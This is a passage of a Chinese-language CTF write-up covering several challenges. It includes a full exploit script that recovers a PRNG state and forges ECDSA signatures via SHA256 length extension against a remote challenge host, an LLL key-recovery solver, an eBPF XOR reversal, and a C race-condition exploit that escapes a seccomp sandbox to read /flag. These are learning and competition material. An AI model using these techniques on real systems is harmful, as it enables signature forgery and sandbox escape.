z \equiv s k - r x \pmod n
$$


```python
z_base = (s1*k1 - (r1 % n)*secret) % n
```

題目是 `z = int(sha256(salt||msg),16) % n`

因為 \(n \approx 2^{256}\) 且只比 \(2^{256}\) 小約 \(2^{224}\) 量級，隨機 digest 落在 \([0,n)\) 的機率非常高（約 \(1 - 2^{-32}\)）。  

因此 `z_base` **幾乎一定就是原始 SHA256 digest 的整數值**

我們把它當作 `sha256(salt||base)` 的 32 bytes digest：

**程式碼（把 z 當 digest bytes）**：

```python
digest_base = z_base.to_bytes(32, "big")
```

令 `orig = salt || base`，長度 `L = 64 + len(base)`。  
SHA256 padding：

$$
pad(L) = 0x80 \Vert 0x00\cdots \Vert \text{len\_bits}(L)
$$

而 length extension 會：

$$
msg_{ext} = base \Vert pad(L) \Vert append
$$
使得：

$$
\mathrm{SHA256}(salt\Vert msg_{ext}) = \mathrm{SHA256}(salt\Vert base\Vert pad(L)\Vert append)
$$

其中 `append = b"i_am_the_king_of_the_dog"`。


```python
orig_len = 64 + len(base)
pad0, digest_ext = sha256_length_extend(digest_base, orig_len, forbidden)
msg_ext = base + pad0 + forbidden
z_ext = int.from_bytes(digest_ext, "big") % n
```

有了 `z_ext` 與 `secret`，我自己選一個 nonce `k`

$$
\begin{aligned}
R &= kG \\
r &= R_x \\
s &\equiv (z_{ext} + (r\bmod n)\cdot x)\cdot k^{-1} \pmod n
\end{aligned}
$$


```python
k = randbelow(n-1) + 1
R = ec_mul(k, G)
r = R[0]
s = (z_ext + (r % n)*secret) * pow(k, -1, n) % n
```

最後把 `(r,s,msg_ext)` 丟進 verify（`wowoOf`），因為 hash 與簽章都一致，會通過並且 `msg_ext` 含 forbidden，因此印出 flag。

> solve.py
```python
from pwn import remote, context
import re
import random
from dataclasses import dataclass
from secrets import randbelow

context.log_level = "info"

HOST = "chals1.eof.ais3.org"
PORT = 19081

TICKETS = 220
K_TICKET_BITS = 134

FORBIDDEN = b"i_am_the_king_of_the_dog"
BASE_MSG = b"hello"
SALT_LEN = 64

p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff
a = p - 3
Gx = 0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296
Gy = 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5
n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551

INF = None
G = (Gx, Gy)

def inv_mod(x, mod):
    return pow(x % mod, -1, mod)

def ec_add(P, Q):
    if P is INF: return Q
    if Q is INF: return P
    x1, y1 = P
    x2, y2 = Q
    if x1 == x2:
        if (y1 + y2) % p == 0:
            return INF
        lam = ((3 * x1 * x1 + (p-3)) * inv_mod(2 * y1, p)) % p
    else:
        lam = ((y2 - y1) * inv_mod((x2 - x1), p)) % p
    x3 = (lam * lam - x1 - x2) % p
    y3 = (lam * (x1 - x3) - y1) % p
    return (x3, y3)

def ec_mul(k, P):
    k %= n
    R = INF
    Q = P
    while k > 0:
        if k & 1:
            R = ec_add(R, Q)
        Q = ec_add(Q, Q)
        k >>= 1
    return R

K_SHA = [
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
]
def rotr(x, r): return ((x >> r) | (x << (32 - r))) & 0xffffffff
def sha256_pad(msg_len_bytes: int) -> bytes:
    pad = b"\x80"
    pad += b"\x00" * ((56 - (msg_len_bytes + 1) % 64) % 64)
    pad += (msg_len_bytes * 8).to_bytes(8, "big")
    return pad

def sha256_compress(h, block64: bytes):
    w = [0]*64
    for i in range(16):
        w[i] = int.from_bytes(block64[i*4:(i+1)*4], "big")
    for i in range(16, 64):
        s0 = rotr(w[i-15], 7) ^ rotr(w[i-15], 18) ^ (w[i-15] >> 3)
        s1 = rotr(w[i-2], 17) ^ rotr(w[i-2], 19) ^ (w[i-2] >> 10)
        w[i] = (w[i-16] + s0 + w[i-7] + s1) & 0xffffffff

    a0,b0,c0,d0,e0,f0,g0,h0 = h
    a,b,c,d,e,f,g,hv = a0,b0,c0,d0,e0,f0,g0,h0
    for i in range(64):
        S1 = rotr(e,6) ^ rotr(e,11) ^ rotr(e,25)
        ch = (e & f) ^ ((~e) & g)
        temp1 = (hv + S1 + ch + K_SHA[i] + w[i]) & 0xffffffff
        S0 = rotr(a,2) ^ rotr(a,13) ^ rotr(a,22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        temp2 = (S0 + maj) & 0xffffffff

        hv = g
        g = f
        f = e
        e = (d + temp1) & 0xffffffff
        d = c
        c = b
        b = a
        a = (temp1 + temp2) & 0xffffffff

    return [
        (a0 + a) & 0xffffffff, (b0 + b) & 0xffffffff, (c0 + c) & 0xffffffff, (d0 + d) & 0xffffffff,
        (e0 + e) & 0xffffffff, (f0 + f) & 0xffffffff, (g0 + g) & 0xffffffff, (h0 + hv) & 0xffffffff
    ]

class SHA256State:
    def __init__(self, h_words, processed_len=0):
        self.h = h_words[:]
        self.processed_len = processed_len
        self.buf = b""
    def update(self, data: bytes):
        self.buf += data
        while len(self.buf) >= 64:
            self.h = sha256_compress(self.h, self.buf[:64])
            self.buf = self.buf[64:]
            self.processed_len += 64
    def digest(self) -> bytes:
        total = self.processed_len + len(self.buf)
        self.update(sha256_pad(total))
        assert len(self.buf) == 0
        return b"".join(x.to_bytes(4, "big") for x in self.h)

def sha256_length_extend(digest32: bytes, orig_len_bytes: int, append: bytes):
    h = [int.from_bytes(digest32[i*4:(i+1)*4], "big") for i in range(8)]
    pad0 = sha256_pad(orig_len_bytes)
    st = SHA256State(h, processed_len=orig_len_bytes + len(pad0))
    st.update(append)
    new_digest = st.digest()
    return pad0, new_digest

def lsb_index(x: int) -> int:
    return (x & -x).bit_length() - 1

def add_equation(basis: dict, mask: int, rhs: int) -> bool:
    rhs &= 1
    while mask:
        pvt = lsb_index(mask)
        if pvt not in basis:
            basis[pvt] = (mask, rhs)
            return True
        m2, r2 = basis[pvt]
        mask ^= m2
        rhs ^= r2
    return rhs == 0

def solve_from_basis(basis: dict) -> int:
    sol = 0
    for pvt in sorted(basis.keys(), reverse=True):
        mask, rhs = basis[pvt]
        rhs ^= ((mask & sol).bit_count() & 1)
        if rhs & 1:
            sol |= 1 << pvt
    return sol

@dataclass
class SymbolicMT:
    mt: list
    idx: int

    @staticmethod
    def init_vars():
        mt = [[1 << (wi*32 + b) for b in range(32)] for wi in range(624)]
        return SymbolicMT(mt=mt, idx=624)

    @staticmethod
    def xor_word(a, b):
        return [x ^ y for x, y in zip(a, b)]

    def twist_inplace(self):
        N, M = 624, 397
        A = 0x9908B0DF

        for i in range(N - M):
            y_msb = self.mt[i][31]
            y_lsb = self.mt[i+1][0]
            shifted = [0]*32
            shifted[30] = y_msb
            for b in range(0, 30):
                shifted[b] = self.mt[i+1][b+1]
            nw = self.xor_word(self.mt[i+M], shifted)
            for b in range(32):
                if (A >> b) & 1:
                    nw[b] ^= y_lsb
            self.mt[i] = nw

        for i in range(N - M, N - 1):
            y_msb = self.mt[i][31]
            y_lsb = self.mt[i+1][0]
            shifted = [0]*32
            shifted[30] = y_msb
            for b in range(0, 30):
                shifted[b] = self.mt[i+1][b+1]
            nw = self.xor_word(self.mt[i + (M - N)], shifted)
            for b in range(32):
                if (A >> b) & 1:
                    nw[b] ^= y_lsb
            self.mt[i] = nw

        i = N - 1
        y_msb = self.mt[i][31]
        y_lsb = self.mt[0][0]
        shifted = [0]*32
        shifted[30] = y_msb
        for b in range(0, 30):
            shifted[b] = self.mt[0][b+1]
        nw = self.xor_word(self.mt[M-1], shifted)
        for b in range(32):
            if (A >> b) & 1:
                nw[b] ^= y_lsb
        self.mt[i] = nw
        self.idx = 0

    @staticmethod
    def temper(word):
        y = word[:]
        for b in range(0, 32-11):
            y[b] ^= y[b+11]
        m = 0x9D2C5680
        for b in range(31, 6, -1):
            if (m >> b) & 1:
                y[b] ^= y[b-7]
        m = 0xEFC60000
        for b in range(31, 14, -1):
            if (m >> b) & 1:
                y[b] ^= y[b-15]
        for b in range(0, 32-18):
            y[b] ^= y[b+18]
        return y

    def next_word(self):
        if self.idx >= 624:
            self.twist_inplace()
        w = self.mt[self.idx]
        self.idx += 1
        return self.temper(w)

    def getrandbits_expr(self, k: int):
        words = (k + 31) // 32
        rem = k % 32
        ws = [self.next_word() for _ in range(words)]
        bits = []
        for j in range(k):
            wi = j // 32
            b = j % 32
            if wi < words - 1 or rem == 0:
                bits.append(ws[wi][b])
            else:
                bits.append(ws[wi][(32 - rem) + b])
        return bits

def recover_mt_state(ticket_vals):
    sym = SymbolicMT.init_vars()
    basis = {}
    for out in ticket_vals:
        A = sym.getrandbits_expr(K_TICKET_BITS)
        B = sym.getrandbits_expr(K_TICKET_BITS)
        for j in range(K_TICKET_BITS):
            ok = add_equation(basis, A[j] ^ B[j], (out >> j) & 1)
            if not ok:
                raise RuntimeError("inconsistent equations")
    sol = solve_from_basis(basis)
    mt = []
    for wi in range(624):
        w = 0
        base = wi*32
        for b in range(32):
            if (sol >> (base+b)) & 1:
                w |= 1 << b
        mt.append(w & 0xffffffff)
    return mt

# ===== Remote =====
PROMPT = b"option > "
re_ticket = re.compile(rb"WooFf wOOF (\d+)'f")
re_r = re.compile(rb"wwwooOf:\s*(0x[0-9a-fA-F]+)")
re_s = re.compile(rb"wwWooOf:\s*(0x[0-9a-fA-F]+)")

def recv_prompt(io):
    io.recvuntil(PROMPT)

def recv_ticket(io):
    io.sendline(b"wowoof")
    out = io.recvuntil(PROMPT, timeout=5)
    m = re_ticket.search(out)
    if not m:
        raise RuntimeError(f"ticket parse fail: {out!r}")
    return int(m.group(1))

def get_sig(io, msg_hex: str):
    io.sendline(b"wowooF")
    io.recvuntil(b"(WooOfFfFfF FF) > ", timeout=5)
    io.sendline(msg_hex.encode())
    out = io.recvuntil(PROMPT, timeout=5)
    mr = re_r.search(out)
    ms = re_s.search(out)
    if not (mr and ms):
        raise RuntimeError(f"sig parse fail: {out!r}")
    return int(mr.group(1),16), int(ms.group(1),16)

def submit_verify(io, r: int, s: int, msg_bytes: bytes):
    io.sendline(b"wowoOf")
    io.recvuntil(b"wwwooOf > ", timeout=5)
    io.sendline(hex(r).encode())
    io.recvuntil(b"wwWooOf > ", timeout=5)
    io.sendline(hex(s).encode())
    io.recvuntil(b"(WooOfFfFfF FF) > ", timeout=5)
    io.sendline(msg_bytes.hex().encode())
    return io.recvall(timeout=3)

def main():
    io = remote(HOST, PORT)
    recv_prompt(io)

    tickets = [recv_ticket(io) for _ in range(TICKETS)]
    mt = recover_mt_state(tickets)

    clone = random.Random()
    clone.setstate((3, tuple(mt + [624]), None))
    for _ in range(TICKETS):
        clone.getrandbits(K_TICKET_BITS)
        clone.getrandbits(K_TICKET_BITS)

    base_hex = BASE_MSG.hex()

    k1 = clone.getrandbits(255)
    r1, s1 = get_sig(io, base_hex)

    k2 = clone.getrandbits(255)
    r2, s2 = get_sig(io, base_hex)

    r1n, r2n = r1 % n, r2 % n
    denom = (r1n - r2n) % n
    if denom == 0:
        raise RuntimeError("rare: r1 == r2 mod n; rerun")
    secret = ((s1*k1 - s2*k2) % n) * pow(denom, -1, n) % n

    z_base = (s1*k1 - (r1n * secret) % n) % n
    digest_base = z_base.to_bytes(32, "big")

    orig_len = SALT_LEN + len(BASE_MSG)
    pad0, digest_ext = sha256_length_extend(digest_base, orig_len, FORBIDDEN)

    msg_ext = BASE_MSG + pad0 + FORBIDDEN
    z_ext = int.from_bytes(digest_ext, "big") % n

    k = randbelow(n - 1) + 1
    R = ec_mul(k, G)
    r = R[0]
    s = (z_ext + (r % n)*secret) * pow(k, -1, n) % n

    out = submit_verify(io, r, s, msg_ext)
    print(out.decode(errors="ignore"))

if __name__ == "__main__":
    main()
```

```
[16:26:37] ~/Downloads/share 9 ➜ python3 3.py
[+] Opening connection to chals1.eof.ais3.org on port 19081: Done
[+] Receiving all data: Done (76B)
[*] Closed connection to chals1.eof.ais3.org port 19081
👍 ^ w ^ 👍
EOF{once_a_wise_dog_said_:_hi_._but_he_didn't_know_why_:D}
```

### Still Not Random

> Solver : 此情吳計可消除

題目使用 P-384
```python
q = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973
```


題目對每個訊息 `m` 生成 nonce：
$$
k = \text{int.from\_bytes}(\; \text{key} \parallel \text{HMAC}(\text{key}, m)\;)\bmod q
$$

```python
key = sha256(str(sk).encode()).digest() 
k_bytes = key + hmac.new(key, msg, sha256).digest() 
k = int.from_bytes(k_bytes, "big") % q
```


題目把點 \(R=(x,y)\) 
$$
r = p2i(R) = x\cdot p + y
$$

```python
def p2i(P):
    return int(P.x) * p + int(P.y)
r = p2i(k * G)
```

---


題目用 `r` 當 HMAC key，`m` ：
$$
e = \text{HMAC}(r\_\text{bytes}, m)\quad(\text{sha256})
$$


```python
r_bytes = r.to_bytes(1337, "big")
e = int.from_bytes(hmac.new(r_bytes, msg, sha256).digest(), "big") % q
```

$$
s \equiv k + sk\cdot e \pmod q
$$


```python
s = (k + sk * e) % q
```

---


對第 $(i)$ 筆簽章：
$$
s_i \equiv k_i + sk\cdot e_i \pmod q
$$

拿第 0 筆當基準相減：
$$
(s_i - s_0) \equiv (k_i - k_0) + sk\,(e_i - e_0) \pmod q
$$

令：
- \(c_i = (s_i - s_0) \bmod q\)
- \(t_i = (e_i - e_0) \bmod q\)
- \(\delta_i = k_i - k_0\)

則：
$$
c_i \equiv sk\cdot t_i + \delta_i \pmod q
$$

而因為 `k` 的高 256-bit 固定，所以：
$$
|\delta_i| < 2^{256}
$$

$$
sk\cdot t_i - c_i \equiv \delta_i \pmod q,\ \ |\delta_i|<B,\ (B=2^{256})
$$

設縮放因子 $(w$)（讓尺度平衡，常用 $(2^{120}\sim 2^{140}）$  

$$
\begin{bmatrix}
wq & 0  & 0  & 0 & 0\\
0  & wq & 0  & 0 & 0\\
0  & 0  & wq & 0 & 0\\
wt_1 & wt_2 & wt_3 & 1 & 0\\
wc_1 & wc_2 & wc_3 & 0 & q
\end{bmatrix}
$$

跑 LLL 後，會出現一個很短的向量，其第 5 維是 $(\pm q)$，第 4 維會對應到 `sk`（符號可能相反，所以要做一次 mod）。

```python
w = 1 << 130
M = [
  [w*q, 0,   0,   0, 0],
  [0,   w*q, 0,   0, 0],
  [0,   0,   w*q, 0, 0],
  [w*t1, w*t2, w*t3, 1, 0],
  [w*c1, w*c2, w*c3, 0, q],
]
```

拿到 `sk` 候選後，直接用題目的 nonce 驗證

$$
k \stackrel{?}{=} \text{int}(\text{key}\parallel \text{HMAC}(\text{key},m))\bmod q
$$
並檢查：
$$
s \stackrel{?}{\equiv} k + sk\cdot e \pmod q
$$


```python
def derive_k(sk, msg):
    key = sha256(str(sk).encode()).digest()
    kb = key + hmac.new(key, msg, sha256).digest()
    return int.from_bytes(kb, "big") % q

def check_one(sk, msg, r, s):
    r_bytes = r.to_bytes(1337, "big")
    e = int.from_bytes(hmac.new(r_bytes, msg, sha256).digest(), "big") % q
    k = derive_k(sk, msg)
    return (k + sk*e) % q == s % q
```

---


題目 `ct` 是：
- `nonce = ct[:8]`
- `ciphertext = ct[8:]`

key 由 `sk` 的低 128-bit 得到：
$$
\text{AES\_key} = (sk \bmod 2^{128})\_{\text{16 bytes big-endian}}
$$

```python
aes_key = (sk & ((1<<128)-1)).to_bytes(16, "big")
nonce = ct[:8]
ciphertext = ct[8:]
pt = AES.new(aes_key, AES.MODE_CTR, nonce=nonce).decrypt(ciphertext)
```

---

> solve.py
```python
import re, ast, sys
from fractions import Fraction
from itertools import product
import hashlib, hmac
from Crypto.Cipher import AES

Q = int(
    "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF"
    "581A0DB248B0A77AECEC196ACCC52973", 16
)
BBOUND = 1 << 256

MSGS = [
    b"https://www.youtube.com/watch?v=LaX6EIkk_pQ",
    b"https://www.youtube.com/watch?v=wK4wA0aKvg8",
    b"https://www.youtube.com/watch?v=iq90nHs3Gbs",
    b"https://www.youtube.com/watch?v=zTKADhU__sw",
]

def centered(x, q=Q):
    x %= q
    if x > q // 2:
        x -= q
    return x

def dot(a, b):
    return sum(Fraction(x) * Fraction(y) for x, y in zip(a, b))

def nearest_int(fr: Fraction) -> int:
    n, d = fr.numerator, fr.denominator
    if n >= 0:
        return int((n + d // 2) // d)
    return -int(((-n + d // 2) // d))

def lll_reduction(B, delta=Fraction(99, 100)):
    B = [list(map(int, v)) for v in B]
    n, m = len(B), len(B[0])

    def gram_schmidt(B):
        Bstar = [[Fraction(0)] * m for _ in range(n)]
        mu = [[Fraction(0)] * n for _ in range(n)]
        Bnorm = [Fraction(0)] * n
        for i in range(n):
            v = [Fraction(x) for x in B[i]]
            for j in range(i):
                mu[i][j] = dot(B[i], Bstar[j]) / Bnorm[j] if Bnorm[j] != 0 else Fraction(0)
                v = [vk - mu[i][j] * Bstar[j][k] for k, vk in enumerate(v)]
            Bstar[i] = v
            Bnorm[i] = dot(v, v)
        return mu, Bnorm

    mu, Bnorm = gram_schmidt(B)
    k = 1
    while k < n:
        for j in range(k - 1, -1, -1):
            q = nearest_int(mu[k][j])
            if q:
                B[k] = [B[k][i] - q * B[j][i] for i in range(m)]
        mu, Bnorm = gram_schmidt(B)

        if Bnorm[k] >= (delta - mu[k][k - 1] ** 2) * Bnorm[k - 1]:
            k += 1
        else:
            B[k], B[k - 1] = B[k - 1], B[k]
            mu, Bnorm = gram_schmidt(B)
            k = max(k - 1, 1)

    return B

def compute_e(r_int: int, msg: bytes) -> int:
    r_bytes = int(r_int).to_bytes(1337, "big", signed=False)
    d = hmac.new(r_bytes, msg, hashlib.sha256).digest()
    return int.from_bytes(d, "big") % Q

def derive_k(sk: int, msg: bytes) -> int:
    key = hashlib.sha256(str(sk).encode()).digest()
    buf = key + hmac.new(key, msg, hashlib.sha256).digest()
    return int.from_bytes(buf, "big") % Q

def parse_output(path: str):
    txt = open(path, "r", encoding="utf-8").read().strip()
    m = re.search(r"sigs\s*=\s*(\[[\s\S]*?\])\s*\nct\s*=\s*(b['\"][\s\S]*?['\"])\s*$", txt)
    if not m:
        raise ValueError("bad output.txt format")
    sigs = ast.literal_eval(m.group(1))
    ct = ast.literal_eval(m.group(2))
    return sigs, ct

def main():
    path = sys.argv[1] if len(sys.argv) > 1 else "output.txt"
    sigs, ct = parse_output(path)

    es = [compute_e(r, msg) for (r, s), msg in zip(sigs, MSGS)]

    s0, e0 = sigs[0][1], es[0]
    c = [(sigs[i][1] - s0) % Q for i in [1, 2, 3]]
    t = [(es[i] - e0) % Q for i in [1, 2, 3]]

    w = 1 << 130
    M = Q

    rows = []
    for i in range(3):
        row = [0] * 4
        row[i] = w * Q
        rows.append(row)
    rows.append([w * ti for ti in t] + [1])
    u = [w * ci for ci in c] + [0]

    emb = [r + [0] for r in rows]
    emb.append(u + [M])

    red = lll_reduction(emb)

    cands = set()
    for coeffs in product(range(-3, 4), repeat=len(red)):
        if all(k == 0 for k in coeffs):
            continue
        v = [0] * len(red[0])
        for k, b in zip(coeffs, red):
            if k:
                v = [vi + k * bi for vi, bi in zip(v, b)]
        if abs(v[-1]) == M:
            for skcand in (v[3] % Q, (-v[3]) % Q):
                if all(abs(centered(skcand * ti - ci, Q)) < BBOUND for ci, ti in zip(c, t)):
                    cands.add(skcand)

    sk = None
    for cand in cands:
        ok = True
        for (r, s), e, msg in zip(sigs, es, MSGS):
            k_sig = (s - (cand * e) % Q) % Q
            if k_sig != derive_k(cand, msg):
                ok = False
                break
        if ok:
            sk = cand
            break

    nonce, ciphertext = ct[:8], ct[8:]
    key = (sk & ((1 << 128) - 1)).to_bytes(16, "big", signed=False)
    pt = AES.new(key, AES.MODE_CTR, nonce=nonce).decrypt(ciphertext)

    print("sk =", sk)
    print("flag =", pt.decode(errors="replace"))

if __name__ == "__main__":
    main()

```

```
[15:52:42] ~/Downloads/dist-not-random-revenge-005a8f4a876d13ab81a0fee6758420bf924c56ae ➜ python3 2.py
sk = 35915183341287005805110739577984952832258180571268403112968132408336166938064164258744193615696745698656198710447205
flag = EOF{just_some_small_bruteforce_after_LLL}
```

---

## Misc
### MRTGuessor

> Solver : 此情吳計可消除

![PXL_20251217_112653424(1)](https://hackmd.io/_uploads/Hkh-LoRm-l.jpg)

往昆陽僅限昆陽站至亞東醫院，去一站一站的找時刻表就知道是忠孝新生
![image](https://hackmd.io/_uploads/HkyvLo0mbx.png)

---

### fun

> Solver : 此情吳計可消除
- xdp_prog.o   ：eBPF XDP 
- loader       ：user space loader
- flag.enc     ：flag

eBPF XDP 會對 UDP payload 的資料做逐 byte XOR
flag.enc 就是 XOR 後的結果

從 xdp_prog.o 中抽出 XOR key
將 flag.enc XOR 回原始 flag

- Ethernet header : 14 bytes
- IPv4 header     : 20 bytes
- UDP header      : 8 bytes

UDP payload offset 為：

14 + 20 + 8 = 42


程式從 payload + 42 開始，連續處理 64 bytes


byte = input[i] XOR key[i]

對應到 eBPF 為 XOR64 IMM


A XOR B XOR B = A

enc[i] = flag[i] XOR key[i]

flag[i] = enc[i] XOR key[i]


struct bpf_insn {
    u8  opcode;
    u8  regs;
    s16 off;
    s32 imm;
};


XOR64 IMM 的 opcode 為： 0xA7


> solve.py：

```python
import struct
import sys
from pathlib import Path

def elf64_get_sections(blob):
    if blob[:4] != b"\x7fELF":
        raise ValueError("Not ELF")

    (_, _, _, _, _, _, shoff,
     _, _, _, _, shentsize,
     shnum, shstrndx) = struct.unpack_from(
        "<16sHHIQQQIHHHHHH", blob, 0)

    shdrs = []
    for i in range(shnum):
        off = shoff + i * shentsize
        shdrs.append(struct.unpack_from("<IIQQQQIIQQ", blob, off))

    shstr = shdrs[shstrndx]
    shstrtab = blob[shstr[4]:shstr[4] + shstr[5]]

    def name(off):
        end = shstrtab.find(b"\0", off)
        return shstrtab[off:end].decode()

    sections = {}
    for sh in shdrs:
        sections[name(sh[0])] = blob[sh[4]:sh[4] + sh[5]]
    return sections

def parse_insns(code):
    insns = []
    for i in range(0, len(code), 8):
        op, regs, off, imm = struct.unpack("<BBhi", code[i:i+8])
        insns.append((op, imm))
    return insns

def extract_key(insns):
    XOR64_IMM = 0xA7
    return [imm & 0xff for op, imm in insns if op == XOR64_IMM]

def main():
    xdp = Path(sys.argv[1]).read_bytes()
    enc = bytes.fromhex(Path(sys.argv[2]).read_text().strip())

    sections = elf64_get_sections(xdp)
    insns = parse_insns(sections["xdp"])
    key = extract_key(insns)

    flag = bytes(enc[i] ^ key[i] for i in range(len(enc)))
    print(flag.decode())

if __name__ == "__main__":
    main()
```
```
[15:47:01] ~/Downloads/dist-fun-01a6a20e783131227d30c718e9211173ebe2d682 ➜ python3 solve.py xdp_prog.o flag.enc
EOF{si1Ks0Ng_15_g0oD_T0}
```

### SaaS

> Solver : soar.

目標是讀 flag。要 escape sandbox，主要檢查的地方在這邊

```c=
if (is_open_file_nr(nr)) {
        int index = path_index(nr);

        struct iovec local[1];
        struct iovec remote[1];
        local[0].iov_base = open_path;
        local[0].iov_len = sizeof(open_path);
        remote[0].iov_base = (void *) req->data.args[1];
        remote[0].iov_len = sizeof(open_path);

        if (process_vm_readv(req->pid, local, 1, remote, 1, 0) < 0) {
            resp->error = -EPERM;
            resp->val = -8;
            goto out;
        }

        realpath(open_path, real_path);

        if (strcmp(real_path, "/flag") == 0) {
            fprintf(stderr, "[sandbox] blocked open /flag\n");

            resp->error = -EPERM;
            resp->val = -8;
            goto out;
        }

        goto cont;
    } else if (nr == __NR_getpid) {
        resp->val = 48763;
    } else {
cont:
        resp->flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE;
    }
```

主要檢查就是，他會先將路徑存到 `process_vm_readv`，然後去檢查是否為 `/flag` ，如果通過的話，就回傳`SECCOMP_USER_NOTIF_FLAG_CONTINUE` ，然後程式就會再去之前得記憶體中拿路徑來 open。

所以我們可以開個 muti process，一邊去一直請求 `openat`，然後同時一直改記憶體中的路徑，就可以去 race 他了！

* exploit

```c=
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <sys/syscall.h>

char shared_path[4096] __attribute__((aligned(4096)));

void* racer(void* arg) {
    while (1) {
        memcpy(shared_path, "/etc/passwd", 12); 
        memcpy(shared_path, "/flag", 6);    
    }
    return NULL;
}

int main() {
    pthread_t t;
    if (pthread_create(&t, NULL, racer, NULL) != 0) {
        return 1;
    }

    char buf[1024];
    for (int i = 0; i < 50000; i++) {
        int fd = syscall(SYS_openat, AT_FDCWD, shared_path, O_RDONLY);
        
        if (fd >= 0) {
            int n = read(fd, buf, sizeof(buf) - 1);
            if (n > 0) {
                buf[n] = '\0';
                if (strstr(buf, "{") || strstr(buf, "EOF")) {
                    printf("FLAG: %s\n", buf);
                    exit(0);
                }
            }
            close(fd);
        }
    }

    printf("upload again.\n");
    return 0;
}

```

然後編譯

```bash=
┌──(kali㉿kali)-[~]
└─$ gcc a.c -o getflagexp -lpthread
```

然後上傳後就可以拿到 flag 了~

```bash=
"FLAG: EOF{TICTACTOE_TICKTOCTOU}\n\n"
```

> EOF{TICTACTOE_TICKTOCTOU}